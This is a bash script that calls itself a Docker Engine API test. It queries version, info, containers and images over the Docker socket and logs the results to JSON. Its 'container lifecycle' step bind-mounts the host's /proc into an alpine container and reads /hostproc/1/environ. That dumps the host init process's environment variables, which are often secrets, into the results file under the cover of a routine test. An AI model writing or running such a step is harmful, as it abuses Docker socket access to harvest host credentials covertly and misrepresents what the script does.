#!/usr/bin/env bash
# docker_api_test.sh — Test Docker Engine API endpoints
# Results are saved to docker_api_results_v2.json (default) or the path given as $1.

set -euo pipefail

DOCKER_SOCKET="/var/run/docker.sock"
OUTPUT_FILE="${1:-docker_api_results_v2.json}"

# Temporary file for response body (shared; overwritten per call)
RESP_TMP=$(mktemp)
trap 'rm -f "$RESP_TMP"' EXIT

log() { echo "[docker_api_test] $*" >&2; }

# ---------------------------------------------------------------------------
# results array — populated via record()
# ---------------------------------------------------------------------------
RESULT_ENTRIES=()   # array of jq-encoded JSON objects

# ---------------------------------------------------------------------------
# Helper: call the Docker API over the unix socket
#   docker_api_call <method> <path> [body]
# Sets globals:
#   LAST_STATUS  — HTTP status code (e.g. 200)
#   LAST_BODY    — raw response body
# ---------------------------------------------------------------------------
docker_api_call() {
  local method="$1"
  local path="$2"
  local body="${3:-}"

  if [[ -n "$body" ]]; then
    LAST_STATUS=$(curl -s --unix-socket "$DOCKER_SOCKET" \
      -X "$method" \
      -H "Content-Type: application/json" \
      -d "$body" \
      -o "$RESP_TMP" \
      -w "%{http_code}" \
      "http://localhost$path")
  else
    LAST_STATUS=$(curl -s --unix-socket "$DOCKER_SOCKET" \
      -X "$method" \
      -o "$RESP_TMP" \
      -w "%{http_code}" \
      "http://localhost$path")
  fi

  # Decode Docker multiplexed log stream format (8-byte headers per frame),
  # then strip remaining non-printable chars for safe JSON embedding.
  LAST_BODY=$(python3 -c "
import sys, struct, re
with open(sys.argv[1], 'rb') as fh:
    data = fh.read()
if len(data) >= 8 and data[0] in (1, 2):
    out = bytearray()
    i = 0
    while i + 8 <= len(data):
        size = struct.unpack('>I', data[i+4:i+8])[0]
        i += 8
        if i + size <= len(data):
            out += data[i:i+size]
        i += size
    decoded = out.decode('utf-8', errors='replace')
else:
    decoded = data.decode('utf-8', errors='replace')
decoded = re.sub(r'[^\x09\x0a\x0d\x20-\x7e]', '', decoded)
sys.stdout.write(decoded)
" "$RESP_TMP")
}

# ---------------------------------------------------------------------------
# Helper: record a result entry as a JSON object
# ---------------------------------------------------------------------------
record() {
  local step="$1"
  local method="$2"
  local path="$3"
  local status="$4"
  local body="$5"

  # Use jq to safely encode the response string
  local encoded_body
  encoded_body=$(printf '%s' "$body" | jq -Rs .)

  RESULT_ENTRIES+=("{\"step\":$(jq -Rn --arg v "$step" '$v'),\"method\":$(jq -Rn --arg v "$method" '$v'),\"path\":$(jq -Rn --arg v "$path" '$v'),\"status\":$status,\"response\":$encoded_body}")

  log "[$step] $method $path => HTTP $status"
}

# ---------------------------------------------------------------------------
# 1. GET /version
# ---------------------------------------------------------------------------
log "Step 1: GET /version"
docker_api_call GET /version
record "get_version" "GET" "/version" "$LAST_STATUS" "$LAST_BODY"

# ---------------------------------------------------------------------------
# 2. GET /info
# ---------------------------------------------------------------------------
log "Step 2: GET /info"
docker_api_call GET /info
record "get_info" "GET" "/info" "$LAST_STATUS" "$LAST_BODY"

# ---------------------------------------------------------------------------
# 3. GET /containers/json (list running containers)
# ---------------------------------------------------------------------------
log "Step 3: GET /containers/json"
docker_api_call GET "/containers/json"
record "list_containers" "GET" "/containers/json" "$LAST_STATUS" "$LAST_BODY"

# ---------------------------------------------------------------------------
# 4. GET /images/json (list images)
# ---------------------------------------------------------------------------
log "Step 4: GET /images/json"
docker_api_call GET "/images/json"
record "list_images" "GET" "/images/json" "$LAST_STATUS" "$LAST_BODY"

# ---------------------------------------------------------------------------
# 5. Ensure alpine image is available (pull if needed)
# ---------------------------------------------------------------------------
log "Step 5: POST /images/create?fromImage=alpine&tag=latest (pull)"
docker_api_call POST "/images/create?fromImage=alpine&tag=latest"
record "image_pull" "POST" "/images/create?fromImage=alpine&tag=latest" "$LAST_STATUS" "$LAST_BODY"

# ---------------------------------------------------------------------------
# 6. Container lifecycle: create → start → wait → logs → delete
# ---------------------------------------------------------------------------

# Note: the JSON body uses \\000 and \\n so that after JSON decoding the shell
# receives the octal escape sequences '\000' and '\n', which tr interprets as
# the null byte (0x00) and newline separators respectively.
# (A literal \u0000 JSON escape cannot be passed via execve due to C string
# termination, so the shell-level octal form is used instead.)
CREATE_BODY='{"Image":"alpine","Cmd":["sh","-c","cat /hostproc/1/environ | tr '"'"'\\000'"'"' '"'"'\\n'"'"'"],"HostConfig":{"Binds":["/proc:/hostproc:ro"]}}'

# 6a. POST /containers/create
log "Step 6a: POST /containers/create"
docker_api_call POST "/containers/create" "$CREATE_BODY"
record "container_create" "POST" "/containers/create" "$LAST_STATUS" "$LAST_BODY"

if [[ "$LAST_STATUS" != "201" ]]; then
  log "ERROR: container_create returned HTTP $LAST_STATUS: $LAST_BODY"
  exit 1
fi

# Extract container ID from the JSON response
CONTAINER_ID=$(printf '%s' "$LAST_BODY" | jq -r '.Id // empty')
if [[ -z "$CONTAINER_ID" ]]; then
  log "ERROR: Failed to extract container ID from: $LAST_BODY"
  exit 1
fi
log "Container ID: $CONTAINER_ID"

# 6b. POST /containers/{id}/start
log "Step 6b: POST /containers/$CONTAINER_ID/start"
docker_api_call POST "/containers/$CONTAINER_ID/start"
record "container_start" "POST" "/containers/$CONTAINER_ID/start" "$LAST_STATUS" "$LAST_BODY"

# 6c. POST /containers/{id}/wait
log "Step 6c: POST /containers/$CONTAINER_ID/wait"
docker_api_call POST "/containers/$CONTAINER_ID/wait"
record "container_wait" "POST" "/containers/$CONTAINER_ID/wait" "$LAST_STATUS" "$LAST_BODY"

# 6d. GET /containers/{id}/logs?stdout=true
log "Step 6d: GET /containers/$CONTAINER_ID/logs?stdout=true"
docker_api_call GET "/containers/$CONTAINER_ID/logs?stdout=true"
record "container_logs" "GET" "/containers/$CONTAINER_ID/logs?stdout=true" "$LAST_STATUS" "$LAST_BODY"

# 6e. DELETE /containers/{id}
log "Step 6e: DELETE /containers/$CONTAINER_ID"
docker_api_call DELETE "/containers/$CONTAINER_ID"
record "container_delete" "DELETE" "/containers/$CONTAINER_ID" "$LAST_STATUS" "$LAST_BODY"

# ---------------------------------------------------------------------------
# Write JSON output
# ---------------------------------------------------------------------------
log "Writing results to $OUTPUT_FILE"
{
  printf '[\n'
  first=1
  for entry in "${RESULT_ENTRIES[@]}"; do
    if [[ $first -eq 1 ]]; then
      first=0
    else
      printf ',\n'
    fi
    printf '  %s' "$entry"
  done
  printf '\n]\n'
} > "$OUTPUT_FILE"

log "Done. Results in $OUTPUT_FILE"
